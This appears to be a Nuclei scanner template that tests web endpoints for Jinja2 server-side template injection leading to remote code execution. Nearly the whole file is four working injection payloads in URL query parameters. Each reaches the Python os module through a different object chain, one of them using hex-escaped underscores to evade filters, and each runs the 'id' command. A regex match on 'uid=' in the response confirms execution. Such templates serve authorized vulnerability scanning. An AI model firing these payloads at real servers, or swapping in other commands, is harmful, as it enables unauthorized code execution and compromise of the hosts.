id: m7-ssti-jinja2-rce
info:
  name: M7 - SSTI Jinja2 RCE via __globals__
  author: Sharlix
  severity: critical
  description: Jinja2 SSTI leading to RCE via __globals__ chain
  tags: ssti,jinja2,rce,python,m7hunter

requests:
  - method: GET
    path:
      - "{{BaseURL}}?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
      - "{{BaseURL}}?name={{lipsum.__globals__['os'].popen('id').read()}}"
      - "{{BaseURL}}?name={{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].strip()}}"
      - "{{BaseURL}}?q={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}"

    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "uid=\d+\(.*?\)"
        part: body
